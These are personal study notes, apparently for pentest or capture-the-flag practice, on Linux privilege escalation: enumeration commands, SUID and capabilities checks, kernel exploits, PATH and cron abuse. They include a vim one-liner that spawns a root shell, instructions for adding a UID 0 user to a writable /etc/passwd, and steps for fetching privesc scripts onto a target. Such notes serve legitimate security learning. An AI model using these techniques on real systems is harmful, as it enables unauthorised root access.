# Linux Privilege Escalation

## Basics and what to look for

- checklists and stuff:
  - <https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md>

### Step 1: Manual Enumeration

- `hostname` : get hostname of target machine (maybe it has valuable information in name)
- - `uname -a` : print detailed system information about kernel --> useful for finding kernel vulnerabilities
- `proc/version` : proc filesystem provides info about target system processes; may give information on kernel version and additional info (compiler etc.)
- `/etc/issue` : systems can also be identified by looking at this file; usually contains info about OS
- `ps` : running processes with some information about them
  - `ps -A` : all running processes
  - `ps axjf` : view process tree
  - `ps aux` : processes for all users (a), displays user that launched the process (u)and shows processes that are not attached to a terminal (x)
- `env` : show environmental variables
- `sudo -l` : target system may be configured to run some commands with root privs; this command lists all commands the logged in user can run with root privileges
  - sometimes like this you'll find that you're able to **run certain commands as root without the root password**
  - with a misconfigured binary like this we can try to exploit them with `GTFOBins` (Unix binaries that can be exploited by attacker to bypass local security restriction) --> <https://gtfobins.github.io/>
- `ls -la` : no comment necessary
- `id` : provides general overview of user's privilege and group memberships; **can also be used to obtain same information for another user**
- `/etc/passwd` : see further down
  - can easily be cut and converted to useful list for brute-force attacks with: `cat /etc/passwd | cut -d ":" -f 1` or, since real user (i.e. no system users) usually have `home`-directory: `cat /etc/passwd | grep home`
- `history` : look for earalier commands on command line
- `ifconfig`
- `ip route`
- `netstat` : listing existing communications
  - `netstat -a` : show all listening ports and established connections
  - `netstat -at`/`netstat -au` : list only TCP or UDP connections
  - `netstat -l` : list ports in listening mode --> these ports are open!!
  - `netstat -tp` : list connections with service name and PID infor
  - `netstat -ano` : display all sockets, do not resolve names, display timers
- `find` : search target system for important info and potential privilege escalation vectors
  | Command | Purpose |
  | --- | ---|
  | `find . -name flag1.txt` | find the file named “flag1.txt” in the current directory |
  | `find /home -name flag1.txt` | find the file names “flag1.txt” in the /home directory |
  | `find / -type d -name config` | find the directory named config under “/” |
  | `find / -type f -perm 0777` | find files with the 777 permissions (files readable, writable, and executable by all users) |
  | `find / -perm a=x` | find executable files |
  | `find /home -user frank` | find all files for user “frank” under “/home” |
  | `find / -mtime 10` | find files that were modified in the last 10 days |
  | `find / -atime 10` | find files that were accessed in the last 10 day |
  | `find / -cmin -60` | find files changed within the last hour (60 minutes) |
  | `find / -amin -60` | find files accesses within the last hour (60 minutes) |
  | `find / -size 50M` | find files with a 50 MB size |
  | `find / -writable -type d 2>/dev/null` | Find world-writeable folders|
  | `find / -writable -type d 2>/dev/null | cut -d "/" -f 2 | sort -u` | Find world-writeable folders and cut and sort|
  | `find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u` | |
  | `find / -perm -222 -type d 2>/dev/null` | Find world-writeable folders|
  | `find / -perm -o w -type d 2>/dev/null` | Find world-writeable folders|
  | `find / -name perl\*` | Perl?? |
  | `find / -name python\*` | Python?? |
  | `find / -name gcc*` | C?? |

### Step 2: Automated Enumeration

- useful links:
  - <https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>
  - <https://github.com/rebootuser/LinEnum>
  - <https://github.com/mzet-/linux-exploit-suggester>
  - <https://github.com/diego-treitos/linux-smart-enumeration>
  - <https://github.com/linted/linuxprivchecker>

### Step 3: Look for Kernel Exploits

- Linux-Kernel manages communication between components such as memory on the system and applications --> requires kernel to have specific privileges and thus a successful exploit will potentially lead to root privileges
- Methodology:
  - Identify Kernel version
  - search/find exploit code for kernel version of target system (e.g.: <https://www.linuxkernelcves.com/cves>, exploit-db, Google etc.)
    - there are also tools like: `LES (Linux Exploit Suggester)`
  - run exploit

### Step 3: check for files with SUID/GUID bit set

- special type file permission which allows file to run with permissions of whoever the owner is --> if it is root: **BINGO**
  - files can be run with permissions of the files owner/group
- when special permission is given to each user it becomes SUID or SGID
  - when extra bit “4” is set to user(Owner) it becomes SUID (Set user ID)
  - when bit “2” is set to group it becomes SGID (Set Group ID)
- permissions to look for when looking for SUID: `rws-rwx-rwx`
- permissions to look for when looking for SUID: `rwx-rws-rwx`
- **finding SUID/GUID Binaries:**
  - `find / -perm -u=s -type f 2>/dev/null` explained:
    - `find` command
    - `/` search whole file system
    - `-perm` search for files with specific permissions
    - `-u=s` any of the permission bits mode are set for the files
    - `-type f` only search filge
    - `2>/dev/null` suppress errors
  - alternative: `find / -type f -perm -04000 -ls 2>/dev/null`
- a good practice would be to compare executables on this list with GTFOBins

### Step: Capabilities

- another method to increase privilege level of a process or binary: Capabilities
- help manage privileges at more granular level for binary or process
- `getcap`: List enabled capabilities
  - when run as unprivileged user, `getcap -r /` will generate huge amount of errors
  - better to redirect them to `/dev/null`: `getcap -r / 2>/dev/null`
- GTFOBins has good list of binaries that can be leveraged for priv esc if we find any set capabilities

./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'

### Step: Privilege Escalation via PATH

- if folder for which my user has write permission is located in the PATH, it could potentially hijack an application to run a script
- questions to ask:
  - what folders are located under $PATH?
  - does my current user have write privileges for any of these folders?
  - can I modify $PATH?
  - is there a script/application I can start that will be affected by this vulnerability?
- add path to $PATH: `export PATH=/tmp:$PATH`

### Step 5: can we read/write sensitive files?

- interesting files e.g.:
  - `/etc/passwd` --> plan text file
    - if we have write access to this file: vulnerability that can allow the creation of a root user that we can access
    - file format:
      - total of seven columns separated by colons:
        - Example: `test:x:0:0:root:/root:/bin/bash`
          1. Username: login name
          2. Password: `x` character indicates that encrypted password is stored in `/etc/shadow`
          3. UserID (UID)
             1. UID 0 = reserved for root
             2. UIDs 1-99 reserved for predefined accounts
             3. UIDs 100-999 reserved by system for administrative and system accounts/groups
             4. UID > 999: Users
          4. GroupID
          5. UserID Info
          6. Home directory
          7. Command/Shell: absolute path of command or shell
    - **Exploit** `/etc/passwd`:
      - simple: if we have writable `/etc/passwd` we can
        - write new line entry to create new user...
        - ...add password hash of our choice
        - set the UID, GID and shell to root allowing us to log in as our own root user
      - Example:
        - create compliant password hash: `openssl passwd -1 -salt [salt] [password]`
        - take this value (WATCHOUT: special characters need to be escaped like `$` with `\$`) to create new root user account
          `newusername:<hashvalue>:0:0:root:/root:/bin/bash`
          Example (with \$): `newuser:\$1\$new\$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash`
        - then you can login using the username and password hash with: `su -l <username>`
- Kernel information --> for kernel exploits
- can we read/write sensitive files?
  - world-writable files: files that any authenticated user can read and write to
  - looking at the permissions of these files, we can check if there is any misconfiguration that allows low privilege users to write to sensitive files
- SUID files
- Crontab Contents --> exploiting yet to check

### Step 6: Cron

- what cronjobs are active: `cat /etc/crontab`
- usually cron jobs run with privilege of their owner and not the current user
- exploit is simple:
  - if there is scheduled task that runs with root privileges and we can change script that will be run then our script will run with root privs
  - look for cronjobs or files that are being invoked by cronjob that are owned by root and if they are writable
  - create command that will return a shell and paste it in the file
  - when the file is executed again the script is run as root

### Step 7: Check PATH-Variable

- show PATH: `echo $PATH`
- how to escalate privileges:
  - if we have a SUID binary, we can rewrite the PATH variable to a location of our choosing
  - ??? nochmal checken wie genau das geht, war schlecht beschrieben

## How to get privlege escalation scripts on target machine

- different possibilites:
  - go to directory, where local copy of privesc script is located on the attaker machine and
    - start webserver: `python3 -m http.server 8000`
    - on the target machine: `wget` and grab the file from the local machine
    - then on target machine make the file executable: `chmod +x <filename.sh>`
  - copy the raw code from Zwischenablage in new file on target machine, save the file with `.sh`-extension and make file executable

## Further Reading

- <https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_-_linux.html>
- <https://payatu.com/blog/a-guide-to-linux-privilege-escalation/>
- <https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>
- <https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/>
- ...
